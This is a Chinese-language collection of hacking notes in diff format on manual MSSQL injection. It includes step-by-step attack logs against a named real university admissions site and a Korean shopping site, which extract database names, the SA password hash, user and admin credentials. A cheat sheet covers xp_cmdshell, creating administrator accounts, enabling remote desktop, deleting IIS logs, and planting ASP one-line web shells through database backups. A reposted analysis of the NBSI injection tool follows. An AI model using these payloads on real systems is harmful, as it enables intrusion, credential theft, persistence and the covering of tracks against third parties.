@@ -1,0 +1,703 @@
+
+检验:"江西农大招生就业网"
+
+1判断：
+关键字%' and 1=1 and '%'='  返回正常
+ 
+关键字%' and 1=2 and '%'='  返回错误
+
+%25%25%25%27%09and%091=1%23   %09代替空格法
+
+2找出keyword
+
+post方式得抓抱：(变量放在最后面，就可以直接放工具跑)
+
+http://zhaojiu.jxau.edu.cn/Web_News/Search.asp?style=3&keyWord=江西
+
+爆字段数:
+冬%' order by 1-- and '%'='  或:   冬%' order by 1 and '%'='
+
+3构造sql注入：
+   
+   爆当前数据库用户名：
+  /Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7%20and%20user=0--   
+  /Web_News/Search.asp?style=3&keyWord=江西'and%20user=0   %BD%AD%CE%F7=江西的url编码
+                         -- ----- 字符型注意有个 ' 号   下面同理-----
+
+  魔术引号开关magic_quotes_gpc
+     这个用pangolin基本上都可以猜出来,其实我们完全可以在注入点后加  and '1'='1'/*  返回正常表明GPC关，否则表明GPC开
+  原理分析： 当GPC开启时，会对' 进行转义，使其变成 \'
+  
+  爆当前数据库版本：
+  /Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20@@VERSION)%3E0--
+  
+   爆当前数据库名：
+  /Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20db_name()%3E0--
+  
+
+  本地服务名:
+  /Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20@@servername%3E0--  pangolin工具得出：JXAU-H1LI7JSV2I
+  *****网页返回：[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 'JXAU-H1LI7JSV2I' 转换成数据类型 int 时失败。
+
+  服务器名：
+  /Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20host_name()=0-- 
+
+
+ 数据库系统用户名：（sa）
+ /Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20system_user%3E0-- 
+ 在将 nvarchar 值 'sa' 转换成数据类型 int 时失败
+
+---------------------------------------------------------------------
+ 判断权限:
+ SA权限:  /Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20cast(is_srvrolemember(0x730079007300610064006d0069006e00)%20as%20nvarchar(1))%2bchar(124)=1%20and%20'1'='1
+
+ DBO权限： /Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20cast(is_member(0x640062005f006f0077006e0065007200)%20as%20nvarchar(1))%2bchar(124)=1%20and%20'1'='1
+-------------------------------------------------------------
+
+爆数据库名：
+  第一个：/Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20top%201%20cast([name]%20as%20nvarchar(500))%2bchar(94)%20from%20[master].[dbo].[sysdatabases]%20where%20[dbid]%20in%20(select%20top%201%20[dbid]%20from%20[master].[dbo].[sysdatabases]%20order%20by%20[dbid]%20desc))%3E0--
+  第二个：/Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20top%201%20cast([name]%20as%20nvarchar(500))%2bchar(94)%20from%20[master].[dbo].[sysdatabases]%20where%20[dbid]%20in%20(select%20top%202%20[dbid]%20from%20[master].[dbo].[sysdatabases]%20order%20by%20[dbid]%20desc))%3E0--
+                                                                                                                                                                                                ------------ 第二个数据库       -----------                                                                           
+爆SA的hash值：
+  /Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%200%3C(select%20top%201%20cast([name]%20as%20nvarchar(4000))%2bchar(94)%2bisnull(master.dbo.fn_varbintohexstr([password_hash]),char(32))%20from(select%20top%20%201%20[name],[password_hash]%20from%20[master].[sys].[sql_logins]%20order%20by%20[name])%20t%20order%20by%20[name]%20desc)-- 
+
+猜表的数量：
+/Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20cast(count(1)%20as%20varchar(10))%2bchar(94)%20from%20[zhaojiuchu].[sys].[all_objects]%20where%20type=char(85))%3E0--    type=char(85)=type=U
+
+爆第一个表名：
+   /Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20top%201%20cast(name%20as%20varchar(500))%20from(select%20top%201%20object_id,name%20from%20[zhaojiuchu].[sys].[all_objects]%20where%20type=char(85)%20order%20by%20object_id)%20t%20order%20by%20object_id%20desc)%3E0--
+爆第二个表名： 
+ /Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20top%201%20cast(name%20as%20varchar(500))%20from(select%20top%202%20object_id,name%20from%20[zhaojiuchu].[sys].[all_objects]%20where%20type=char(85)%20order%20by%20object_id)%20t%20order%20by%20object_id%20desc)%3E0-- 
+
+爆表的id：
+/Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20top%201%20cast([id]%20as%20nvarchar(20))%2bchar(94)%20%20from%20[zhaojiuchu].[sys].[sysobjects]%20where%20name=0x420061007300650044006100740061005f005a0068006900570065006900)%3E0--
+
+猜列的数量：
+
+/Web_News/Search.asp?style=3&keyword=%BD%AD%CE%F7'%20and%20(select%20cast(count(1)%20as%20varchar(8000))%2bchar(94)%20from%20[zhaojiuchu]..[users]%20where%201=1)%3E0--
+/Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20cast(count(1)%20as%20varchar(10))%2bchar(94)%20from%20[zhaojiuchu].[sys].[all_columns]%20where%20object_id=2099048)%3E0--
+     varchar 值 '5^' 转换成数据类型 int 时失败
+第一个列名：
+%20and%20(select%20top%201%20cast(name%20as%20varchar(500))%20from%20(select%20top%201%20column_id,name%20from%20[zhaojiuchu].[sys].[all_columns]%20where%20object_id=2099048%20order%20by%20column_id)%20t%20order%20by%20column_id%20desc)%3E0-- 
+
+第二个列名：
+Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20top%201%20cast(name%20as%20varchar(500))%20from%20(select%20top%202%20column_id,name%20from%20[zhaojiuchu].[sys].[all_columns]%20where%20object_id=2099048%20order%20by%20column_id)%20t%20order%20by%20column_id%20desc)%3E0--
+
+爆数据：
+  记录条数：
+                                                  
+  Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20cast(count(1)%20as%20varchar(8000))%2bchar(94)%20from%20[zhaojiuchu]..[users]%20where%201=1)%3E0--
+  爆用户名:
+  Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20top%201%20cast(username%20as%20varchar)%2bchar(94)%20from%20(select%20top%201%20[username],[password]%20from%20[zhaojiuchu]..[users]%20where%201=1%20order%20by%20[username])%20t%20where%201=1%20order%20by%20[username]%20desc%20)%3E0%20and%20'1'='1   爆不出来：
+  Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20top%201%20cast(username%20as%20varchar)%2bchar(94)%20from%20(select%20top%201%20[username],[password]%20from%20[zhaojiuchu]..[users]%20where%201=1%20order%20by%20[username])%20t%20where%201=1%20order%20by%20[username]%20desc%20)%3E0--                返回结果
+                                                                                     username或password                                            第一条记录的
+爆密码：
+ Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20top%201%20cast(password%20as%20varchar)%2bchar(94)%20from%20(select%20top%201%20[username],[password]%20from%20[zhaojiuchu]..[users]%20where%201=1%20order%20by%20[username])%20t%20where%201=1%20order%20by%20[username]%20desc%20)%3E0%20and%20'1'='1
+ Web_News/Search.asp?style=3&keyWord=%BD%AD%CE%F7'%20and%20(select%20top%201%20cast(password%20as%20varchar)%2bchar(94)%20from%20(select%20top%201%20[username],[password]%20from%20[zhaojiuchu]..[users]%20where%201=1%20order%20by%20[username])%20t%20where%201=1%20order%20by%20[username]%20desc%20)%3E0--
+----------------------------------pangolin3.0版本可以成功爆出用户和密码----------------------------------------------
+ 爆第一条记录的用户名和密码：
+/Web_News/Search.asp?style=3&keyword=%BD%AD%CE%F7'%20and%20(select%20top%201%20isnull(cast([username]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([password]%20as%20nvarchar(4000)),char(32))%20from%20[zhaojiuchu]..[users]%20where%201=1%20order%20by%20[username])%3E0--
+爆出一条记录用用户名和密码（除第一条用户名和密码：）                                                                                                                                                                                                                         not除                  第一条                                                                       按姓名排序
+/Web_News/Search.asp?style=3&keyword=%BD%AD%CE%F7'%20and%20(select%20top%201%20isnull(cast([username]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([password]%20as%20nvarchar(4000)),char(32))%20from%20[zhaojiuchu]..[users]%20where%201=1%20and%20username%20not%20in%20(select%20top%201%20username%20from%20[zhaojiuchu]..[users]%20where%201=1%20order%20by%20[username])%20order%20by%20[username])%3E0--
+
+同上：除第二条记录的
+/Web_News/Search.asp?style=3&keyword=%BD%AD%CE%F7'%20and%20(select%20top%201%20isnull(cast([username]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([password]%20as%20nvarchar(4000)),char(32))%20from%20[zhaojiuchu]..[users]%20where%201=1%20and%20username%20not%20in%20(select%20top%201%20username%20from%20[zhaojiuchu]..[users]%20where%201=1%20order%20by%20[username])%20order%20by%20[username])%3E0-- 
+/Web_News/Search.asp?style=3&keyword=%BD%AD%CE%F7'%20and%20(select%20top%201%20isnull(cast([username]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([password]%20as%20nvarchar(4000)),char(32))%20from%20[zhaojiuchu]..[users]%20where%201=1%20and%20username%20not%20in%20(select%20top%200%20username%20from%20zhaojiuchu..users%20where%201=1%20group%20by%20username))%3E0--   第一条，top%200 
+/Web_News/Search.asp?style=3&keyword=%BD%AD%CE%F7'%20and%20(select%20top%201%20isnull(cast([username]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([password]%20as%20nvarchar(4000)),char(32))%20from%20[zhaojiuchu]..[users]%20where%201=1%20and%20username%20not%20in%20(select%20top%201%20username%20from%20zhaojiuchu..users%20where%201=1%20group%20by%20username))%3E0--   第二条：
+----------------------------------------------------------------------------------------------------------------------------
+
+
+                       mssql手工注入语句
+
+=============================================================================
+
+and exists (select * from sysobjects)                   //判断是否是MSSQL
+
+and 1=convert(int,@@version） 或  1=(select @@version)   //判断数据库版本
+;declare @d int                                         //是否支持多行
+
+and (select count(1) from [sysobjects])>=0             //是否支持子查询
+
+and user>0                                            //获取当前数据库用户名
+and db_name>0                                        //获取当前数据库名称
+
+and 1=convert(int,db_name())  或  1=(select db_name())  //当前数据库名
+and 1=(select @@servername)                            //本地服务名
+and 1=(select IS_SRVROLEMEMBER('sysadmin'))           //判断是否是系统管理员
+and 1=(select is_srvrolemember('db_owner')            //判断是否是库权限
+and 1=(select is_srvrolemember('public')             //判断是否为Public权限
+having 1=1 --                                        //爆取当前数据库信息
+group by 表名.列名 having 1=1 --               //爆取其他表名，由上句语句得来
+
+group by 表名.列名1,表名.列名 having 1=1 --          //继续爆当前表中的其他列名
+
+and (select top 1 name from(select top N id,name from sysobjects where
+     xtype='U[或char(85)]' and status>0) order by id desc)>1
+                              //N从1开始递增即可爆当前库中所有表名,按ID降序排列
+
+或 and (select top 1 name from sysobjects where xtype='U' and name not in
+      (select top N name from sysobjects where xtype='u'))>1   //同上
+
+and (select top 1 name from master.dbo.sysdatabases order by dbid)>1
+                                                      //跨库查询,爆第一个
+and (select top 1 name from master.dbo.sysdatabases where name not in
+       (select top N name from master.dbo.sysdatabases order by dbid))>1
+                                                     //跨库查询,N从1开始递增
+and (select top 1 col_name(object_id('表名'),N）from sysobjects)>1
+                                            //爆指定表中任意列名,N从1开始递增
+        
+       [扩展存储]
+
+and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype='X' AND
+        name='xp_cmdshell')                       //判断xp_cmdshell是否存在
+and 1=(select count(*) FROM master.dbo.sysobjects where
+        name= 'xp_regread')            //查看xp_regread扩展存储过程是已被删除
+;exec sp_addextendedproc xp_cmdshell,'xplog70.dll'       //恢复xp_cmdshell
+;exec sp_addextendedproc ‘xp_cmdshell’,'c:\xplog70.dll’  //自定义恢复路径
+
+;exec sp_dropextendedproc 'xp_cmdshell'                  //删除xp_cmdshell
+;exec master..xp_cmdshell 'dir c:\'                     //查看服务器C盘目录
+添加和删除一个SA权限的数据库用户hakz:（需要SA权限）
+exec master.dbo.sp_addlogin hakz,password
+exec master.dbo.sp_addsrvrolemember hakz,sysadmin
+停掉或激活某个服务:（需要SA权限）
+;exec master..xp_servicecontrol 'stop','schedule'             //规则服务
+;exec master..xp_servicecontrol 'start','schedule'
+;exec master..xp_servicecontrol 'start', 'server'          //启动SERVER服务
+获取WEB路径:
+①利用xp_cmdshell搜索：
+;exec master..xp_cmdshell 'dir /s d:/index.asp'
+②利用IIS接口获得网站根目录：
+cmd /c cscript.exe C:\Inetpub\AdminScripts\adsutil.vbs ENUM W3SVC/1/root
+cmd /c cscript.exe C:\Inetpub\AdminScripts\adsutil.vbs ENUM W3SVC/2/root
+③读取注册表：(Public 即可)
+exec master.dbo.xp_regread
+HKEY_LOCAL_MACHINE,
+'SYSTEM\CurrentControlSet\sERVICES\W3SVC\Paramenters\VirtualRoots\’’/'
+④利用OLE控件中的SP_OAMETHOD函数：
+;declare @shell int
+;exec master..SP_OAMETHOD 'wscript.shell',@shell out
+;exec master..SP_OAMETHOD @shell,'run',null,'cmd.exe/c dir /s
+  d:/index.asp >c:/log.txt'
+⑤利用xp_dirtree列目录：(Public 即可)
+  建立临时表：;CREATE TABLE temp([id] INT IDENTITY (1,1) NOT NULL,
+            [name][nvarchar](300) NOT NULL,[depth][int] NOT NULL,
+            [isfile][nvachar](50) NULL);
+            insert into temp exec master..xp_dirtree ‘d:/’,1,1
+ 读取表中数据： and (select name from temp where id=N)>1  N从1开始递增
+ 删除临时表：   ;drop table temp;--检测SP_OAcreate是否存在：
+and 1=(SELECT count(*)FROM master.dbo.sysobjects WHERE name='SP_OAcreate')
+
+利用SP_OAcreate执行CMD命令：
+;DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC
+   SP_OAMETHOD @shell,'run',null, 'C:\WINNT\system32\cmd.exe /c net user
+    hakz hakz /add'
+
+设置虚拟目录E为可读：
+
+;declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod
+    @o, 'run', NULL,' cscript.exe c:\inetpub\wwwroot\chaccess.vbs –a
+    w3svc/1/ROOT/e +browse'利用xp_cmdshell添加用户：(需要SA权限)
+;exec master.dbo.xp_cmdshell 'net user hakz hakz /add'
+;exec master.dbo.xp_cmdshell 'net localgroup administrators hakz /add'DOS下开3389 并修改端口号：
+sc config termservice start= auto
+net start termservice
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+    Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f     //允许外部联接
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+    Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD   //改端口到80开启数据库的远程连接：
+①;select * from OPENROWSET
+   ('SQLOLEDB','server=servername;uid=sa;pwd=pass',’select * from table’)
+
+②;select * from OPENROWSET
+   ('SQLOLEDB', 'uid=sa;pwd=pass;Network=DBMSSOCN;Address=1.2.3.4,1433;',
+     'select * from table')
+删除日志记录：
+;exec master.dbo.xp_cmdshell 'del c:\winnt\system32\logfiles\w3svc5
+      \ex100401.log >c:\temp.txt'
+替换日志记录：
+;exec master.dbo.xp_cmdshell 'copy c:\winnt\system32\logfiles\w3svc5
+\ex090404.log c:\winnt\system32\logfiles\w3svc5\ex100401.log >c:\temp.txt'
+差异备份语句：
+①完整备份一次：
+  ;backup database 库名 to disk=’c:\hakz.bak’;--
+②创建表并插入数据：
+  ;create table [dbo].[dtest]([cmd][image]);
+  ;insert into dtest(cmd) values
+    (0x3C25657865637574652072657175657374282268616B7A2229253E);--
+③差异备份：
+  ;backup database 库名 to disk=’WEB路径\z.asp’ with DIFFERENTIAL,FORMAT;--
+LOG备份语句：
+;alter database null set RECOVERY FULL --           //激活数据库为还原模式
+;create table cmd (a image)—-
+;backup log null to disk=’c:\cmd’ with int --
+;insrt into cmd(a) values
+    (0x3C25657865637574652072657175657374282268616B7A2229253E) --
+;backup log null to disk=‘备份路径' 
+
+有时候可能一句话备份不能成功，可以多试试以下几个版本：
+<%%25Execute(request(”hakz”))%%25>
+<%Execute(request(”hakz”))%>
+%><%execute request(”hakz”)%><%
+<script language=VBscript runat=server>execute request("hakz")</script>
+<%25Execute(request(”hakz”))%25>
+如果备份的数据库名里面有特殊符号，要用[]包含起来.
+ 沙盒模式提权：(需要SA权限)
+ 当是SA权限但是xp_cmdshell被删除或xplog70.dll无法恢复时适用
+ ①打开沙盒模式
+ ;EXEC master.dbo.xp_regwrite
+ ‘HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0
+②利用默认Access数据库
+ ;Select * From
+   OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select
+    shell("net user hakz hakz /add")');
+         MSSQL手工注入语句常用的大概就这么多了，有些比较偏僻的就没有收录了，不过以后要有用时我还是会及时地把它们添加进来的 ~O(∩_∩)O~
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+===================================================================================================
+                  NBSI 注入分析跟踪报告（MSSQL篇）
+
+=======================================================================================
+作者：Softbug 文章来源：情感网络 
+
+编写一个好的工具不容易，编写一个注入工具更是不容易。这篇文章系统通过跟踪NBSI的注入过程来分析牛人的测试思路。对手工分析刺探很有帮助。仔细跟踪NBSI的刺探结果也是对注入攻击的一种欣赏。 
+  
+首先我们找到了一家IT站点做测试，测试的目录仅仅是为了跟踪NBSI的刺探思路，不曾对该网站进行过恶意的破坏！ 
+  
+1         注入点的探测 
+假设注入点为：http://www.xxx.com/zhuru.asp?id=1 
+那么NBSI会首先试探这样的连接：http://www.xxx.com/zhuru.asp?id=1 and user%2bchar(124)>0 
+最开始不明白为什么要叫个Char(124),这个值其实是个”|”符号。后面我们会说到。 
+当然了，这样IIS会报错，返回一个500的内部错误号码，也许作者就以此为根据吧。 
+3         猜解表名 
+跟踪发现，作者用一句话就完成一个表名的猜解，效率的确很高。具体的表名猜测代码为： 
+And (Select Top 1 cast(name as varchar(8000)) from(Select Top 1 id,name from sysobjects Where xtype=char(85) order by id) T order by id desc)>0 
+看见红色的1了吗？这个就是猜测数据表的表名数值！如果是第一个表，当然就为1，如果是第一个表那么这个1就改为2就是了，以此类推。 
+  
+那么我们如何决定表名已经猜测完毕了呢？这个简单，跟踪发现，只要 表名数值 X 和 X+1 个表返回的表名值是一样的表示猜测完毕了。 
+5         猜测列名 
+跟踪发现，作者也是用一句话就完成了一个表名的猜解。可能这个就是对MSSQL猜解的好处吧！换了Access可能也是要一个字母一个字母的去猜。具体的猜解列名的代码为： 
+And (Select Top 1 cast(name as varchar(8000)) from (Select Top 1 colid,name From syscolumns Where id = OBJECT_ID(NCHAR(78)%2BNCHAR(101)%2BNCHAR(119)%2BNCHAR(115)%2BNCHAR(95)%2BNCHAR(85)%2BNCHAR(115)%2BNCHAR(101)%2BNCHAR(114)) Order by colid) T Order by colid desc)>0 
+看到红色的1了吗？这个表示我们要猜测列名的序列值。换成2就表示要猜测第2个列名。判断结束的方式和判断表名结束的方式一样。 
+注意一点： 
+NCHAR(78)%2BNCHAR(101)%2BNCHAR(119)%2BNCHAR(115)%2BNCHAR(95)%2BNCHAR(85)%2BNCHAR(115)%2BNCHAR(101)%2BNCHAR(114) 
+为了饶过 ‘ 符号的限制，作者尽量使用Nchar来连接表名的字符串值。上面这一传实际上就代表了一个表的字符串值。括号里面的数字是字符的ASC码。 
+  
+举例： 
+如果我们要猜测xfiletd这个表名，我们只要用HUIE的插件换算一下就OK了！ 
+见下图： 
+ 
+我们就得到了下面字符： 
+nchar(78)%2bnchar(66)%2bnchar(69)%2bnchar(6C)%2bnchar(65)%2bnchar(74)%2bnchar(75) 
+呵呵！速度快吧！ 
+  
+6        猜解数据 
+下面我们来看看NBSI是如何猜解数据的，按道理应该是“暴”，让我们期待一下牛人是如何暴数据的。 
+1） 得到字段的记录个数 
+And%20(Select%20Cast(Count(1)%20as%20varchar(8000))%2Bchar(97)%20From%20[News_Style]%20Where%201=1)>0 
+其中红色的News_Style代表我们要猜解的表名，这里作者用到了一个常用的暴表技巧。我们得到了字段数以后，字段是个INT类型的值，他和0比较是不会发生类型转换错误的。换句话说，记录就不会自动的“招”。如果我们在和0比较的时候实现就把把它和Char(97)//字符a 相连接，那么我们得到的就会是个字符串了。和零比较的时候自然就暴出了“记录个数”+a  这样一个数值来。现在大家该明白为什么第一步的刺探要加一个”|”符号了吧！谜底解开了。 
+ 
+2） 得到字段的值 
+得到了记录个数，然后不断的循环而暴出字段的值。还好，作者没用什么奇特的招数。作者的代码为： 
+And (Select Top 1 isNull(cast([sName] as varchar(8000)),char(32))%2Bchar(124) From (Select Top 9 sName From [News_Style] Where 1=1 Order by sName) T Order by sName desc)>0 
+红色的news_style我不多解释了，就是要猜解的数据表名，绿色的9表示要得到第就 sname字段的第9条记录的值。循环几次，呵呵！数据就到手了。 
+大家注意一下：char(124)这个东西。它的目的也在于把数据统统转化为字符串类型然后和int类型进行比较，然后暴出数据。道理如前所述！这就是NBSI为什么在得到的字段里面有”|”这样的值的原因。作者也许懒得处理罢了。：-） 
+ 
+看到了吗？后面都有”|”符号。 
+  
+3）  关于双数据和N个数据的猜测 
+大家也许觉得，NBSI猜测数据字段的值的速度很快，跟踪分析了一下，的确不错。假设我们要猜测一个表的2个字段的值。那么我们该如何写代码呢？ 
+ NBSI的代码是这样写的： 
+第一步还是用１）的办法得到记录个数。第二步就用： 
+  
+And (Select Top 1 isNull(cast([UserName] as varchar(8000)),char(32))%2Bchar(124)%2BisNull(cast([PassWord] as varchar(8000)),char(32)) From (Select Top 1 UserName,PassWord From [News_User] Where 1=1 Order by UserName,PassWord) T Order by UserName desc,PassWord desc)>0 
+ 
+（注意看|符号隔开了2个数值） 
+News_user是一个表名，Char(124)我就不多解释了。大家可以照着猫画虎，把上面的语句和2）里面的语句进行对比一下。具有基本地球人功能的我想都能看出来作者是怎么暴多字段值的了吧。如果你高兴，一次把数据库的值都暴出来都无所谓。这里间接的提醒一下大家：暴一个字段的值的网络开销和暴全部的值的网络开销差不了多少，下次玩NBSI的时候记得把所有的值都挂上吧！J 
+  
+总结：有希望完成自己VB代码的朋友可能根据我们分析的结果编写程序，你们也将拥有属于自己的NBSI。如今的HUIE就具有这样的功能。希望大家去www.hack0.net访问。 
+  
+  
+后序： 
+写程序最重要的就是编程思路，也许你看到的只是编写一个好程序的部分细节罢了。大家有没意思到，NBSI是如何判断网站能否注入的呢？其实单靠SQL暴错只是一个思路罢了。NBSI给我们展现的两种思路是： 
+2         判断IIS的报头 以正常返回200,101 为基础，如果返回500则表示出现了错误。 
+3         逐字逐句的判断IIS的返回信息，然后自己对比是否有注入的可能性！（因为，有些网站返回的HTML信息量是非常大的！用程序判断仍然很费时间，不推荐） 
+更多的东西，其实我们还需要学习。不光是暴库，搞注入。 
+  
+NBSI其实是一个项目很大的软件，我们的分析是完全建立在IIS的错误提示开启的状态下完成的。     而且是使用的”数字型“的注入方式。局限是有点，我们会继续跟踪以完全挖掘NBSI的注入思路的。Access注入的判断也许就是一个难恼人的编程项目。换了是你，你能编写出来吗？NBSI还有很多地方不健全，看了我们的文章也许你有办法可以编写出更牛的NB出来。有兴趣的朋友可以继续关注我们的NBSI分析报告。更欢迎有志之人能把编写出自己的网络小插件发到www.hack0.net来！ 
+  
+Ps: 关于HUIE和HUIE插件的介绍请大家到www.hack0.net查询。更详细的讨论可以到www.hackerxfiles.net的[URL=http://bbs.77169.com]论坛[/URL]来发言。 
+  
+附语： 
+细想这INternet发展的速度真的是很快,稍微不注意就跟不上安全的节奏.对网管来说(其实很多接触安全的人都是网管),一个黑客工具,一个小小的漏洞对网管来说都可能造成严重的后果.
+
+
+
+
+
+
+搜索型注入语句［二］
+
+
+
+
+
+
+  帖几个baidu出来的关于搜索型注入的文章。百度货，不知道作者是哪个，感谢了先。。 ^_^
+简单的判断搜索型注入漏洞存在不存在的办法是先搜索&#39;，如果出错，说明90%存在这个漏洞。然后搜索%，如果正常返回，说明95%有洞了。
+
+然后再搜索一个关键字，比如2006吧，正常返回所有2006相关的信息，再搜索2006%&#39;and 1=1 and &#39;%&#39;=&#39;和2006%&#39;and 1=2 and &#39;%&#39;=&#39;，存在异同的话，就是100%有洞了。
+
+我这里看出有上面说的洞后开始用nbsi来扫，结果总是超时，郁闷，看来要手工来暴需要的信息了。。。
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and user>0 and &#39;%&#39;=&#39; //得到当前数据库账号
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and db_name()>0 and &#39;%&#39;=&#39; //得到当前数据库名
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select count(*) from admin)>0 and &#39;%&#39;=&#39; //返回错误页面，看来是没有admin这个表了
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select top 1 name from lvhuana3.dbo.sysobjects where xtype=&#39;u&#39; and status>0)>0 and &#39;%&#39;=&#39; //得到当前数据库的第一个表名
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select top 1 name from lvhuana3.dbo.sysobjects where xtype=&#39;u&#39; and status>0 and name not in(&#39;codechange&#39;))>0 and &#39;%&#39;=&#39; //得到当前数据库的第二个表名
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select top 1 name from lvhuana3.dbo.sysobjects where xtype=&#39;u&#39; and status>0 and name not in(&#39;codechange&#39;,&#39;oldpoint&#39;))>0 and &#39;%&#39;=&#39; //得到当前数据库的第三个表名
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and%20(select%20top%201%20name%20from%20lvhuana3.dbo.sysobjects%20where%20xtype=&#39;u&#39;%20and%20status>0%20and%20name%20not%20in(&#39;codechange&#39;,&#39;oldpoint&#39;,&#39;tbl_admin&#39;,&#39;tbl_afterservice&#39;,&#39;tbl_agent&#39;,&#39;tbl_bank&#39;,&#39;tbl_board&#39;,&#39;tbl_board2&#39;,&#39;tbl_brandbestLeft&#39;,&#39;tbl_brandbestRight&#39;,&#39;tbl_card&#39;,&#39;tbl_cart&#39;,&#39;tbl_catalogue&#39;,&#39;tbl_community&#39;,&#39;tbl_court&#39;,&#39;tbl_estimate&#39;,&#39;tbl_FAQ&#39;,&#39;tbl_mail_list&#39;,&#39;tbl_mem_add&#39;,&#39;tbl_mem_main&#39;,&#39;tbl_mem_out&#39;,&#39;tbl_mem_rboard&#39;,&#39;tbl_mileage&#39;,&#39;tbl_notice&#39;,&#39;tbl_ord_cash_receipt&#39;,&#39;tbl_ord_change&#39;&#39;tbl_ord_cs&#39;,&#39;tbl_ord_change&#39;,&#39;tbl_ord_cs&#39;,&#39;tbl_ord_main&#39;,&#39;tbl_ord_payment&#39;,&#39;tbl_ord_prd&#39;,&#39;tbl_ord_prd_return&#39;,&#39;tbl_ord_refund&#39;,&#39;tbl_ord_req_main&#39;,&#39;tbl_ord_req_prd&#39;,&#39;tbl_ord_request&#39;,&#39;tbl_ord_user&#39;,&#39;tbl_partition&#39;,&#39;tbl_prd_category&#39;,&#39;tbl_prd_click&#39;,&#39;tbl_prd_desc&#39;,&#39;tbl_prd_grade&#39;,&#39;tbl_prd_main&#39;,&#39;tbl_prd_model&#39;,&#39;tbl_recommand&#39;,&#39;tbl_saleshop&#39;,&#39;tbl_search&#39;,&#39;tbl_tax&#39;,&#39;tbl_zipcode&#39;,&#39;tempDesc&#39;,&#39;tempdesc2&#39;,&#39;tempmodel&#39;,&#39;tempPrdMain&#39;,&#39;tempPrdmodel&#39;,&#39;tempsize&#39;,&#39;tempstyle&#39;,&#39;tmpordprd&#39;,&#39;tmpordprd2&#39;,&#39;trace1&#39;))>0%20and%20&#39;%&#39;=&#39; //依次类推，得到所有的表
+
+其实分析可以知道只有这个tbl_admin表才是最重要的。接着开始暴列名。
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select top 1 col_name(object_id (&#39;tbl_admin&#39;),1) from tbl_admin)>0 and &#39;%&#39;=&#39; //得到tbl_admin这个表里的第一个列名c_employee_id
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select top 1 col_name(object_id (&#39;tbl_admin&#39;),2) from tbl_admin)>0 and &#39;%&#39;=&#39; //得到tbl_admin这个表里的第二个列名c_employee_name
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select top 1 col_name(object_id (&#39;tbl_admin&#39;),3) from tbl_admin)>0 and &#39;%&#39;=&#39; //得到tbl_admin这个表里的第三个列名c_password
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select top 1 col_name(object_id (&#39;tbl_admin&#39;),3) from tbl_admin)>0 and &#39;%&#39;=&#39; //得到tbl_admin这个表里的第四个列名c_level
+
+列名暴完毕了，嘿嘿，接着开始暴管理员账号密码了。
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select top 1 c_employee_id from tbl_admin)>0 and &#39;%&#39;=&#39; //得到第一个管理员的id为943hoon
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select c_employee_id from(select top 1 * from(select top 2 * from tbl_admin order by 1)T order by 1 desc)S)>0 and &#39;%&#39;=&#39; //得到第二个管理员的id为champ
+
